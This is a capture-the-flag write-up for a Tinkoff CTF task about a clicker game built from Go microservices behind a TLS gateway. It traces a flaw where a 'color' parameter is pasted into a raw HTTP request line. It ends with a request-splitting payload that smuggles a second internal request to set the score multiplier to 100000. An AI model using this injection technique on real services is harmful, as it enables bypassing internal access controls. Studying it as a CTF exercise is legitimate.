# CZF

## Task
[Task link](https://ctf.tinkoff.ru/tasks/demiurg)

Каждый день Сизиф катит в гору камень, но он скатывается вниз. Станьте демиургом — измените мир. Сделайте так, чтобы камень сам катился в гору и больше не скатывался.

Игра: t-demiurg-iuzq2gj3.spbctf.net/

Исходный код игры: czf_6h5g94e.tar.gz

## Solution

We have three microservices, with tls communication, like service mesh.
1. Gateway - reverse proxy for both client and service. When special header `X-From-Service` passed, gateway will verify client certificate with it's [ca.crt](czf/apigateway/src/ca.crt). Also adds `X-UserID` header to all requests.
2. User Info - microservice that handles user information.
3. Shop - microservice, where you can make click, buy theme and but premium.

Let's look at how premium purchase occur.
Shop just sets multipler=10 to your user info.

```go
params = fmt.Sprintf("multiplier=%d", 10)
client.Post("https://apigateway:9443/api/setUserMultiplier?" + params, headers)
```

Let's look at the beginning of `Post` method.

```go
func (c *Client) Post(urlString string, headers map[string]string) (string, []byte, error) {
  host := "apigateway:9443"
  conn, err := tls.Dial("tcp", host, c.Config)
  if err != nil {
    return "", []byte{}, err
  }
  defer conn.Close()
  request := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\n", urlString, host)
  ...
}
```

If we can control `urlString` we can split request to arbitrary number of requests.
Trying to search for url we control.

Find eventually function [changeColor](czf/shop/src/main.go#30) on the endpoint `/api/buyColor`.

```go
func changeColor(c *gin.Context) {
    userID := c.GetHeader(UserIDHeaderName)
    color := c.Query("color")
    ...
    params = fmt.Sprintf("color=%s", color)
    client.Post("https://apigateway:9443/api/setUserColor?" + params, headers)
    ...
}
```

How we can find user id?

```go
func (app *App) login(c *gin.Context) {
  ...
  sessionValue := createAndSignSession(string(userInfoRow.UserID))
  c.SetCookie("session", sessionValue, 3600000, "", "", false, false)
  ...
}

func createAndSignSession(userID string) string {
  payload := []byte(userID)
  ...
  return string(payload) + "." + string(hex.EncodeToString(expectedMAC))
}
```

We just take uuid up to the first point in session value.

And finaly color value in http request to `/api/buyColor`.
```
black HTTP/1.1
Host: apigateway:9443
X-From-Service: Yes
X-User-ID: <user-uuid-from-cookie>

POST https://apigateway:9443/api/setUserMultiplier?multiplier=100000 HTTP/1.1
Host: apigateway:9443
X-From-Service: Yes
X-User-ID: <user-uuid-from-cookie>
```
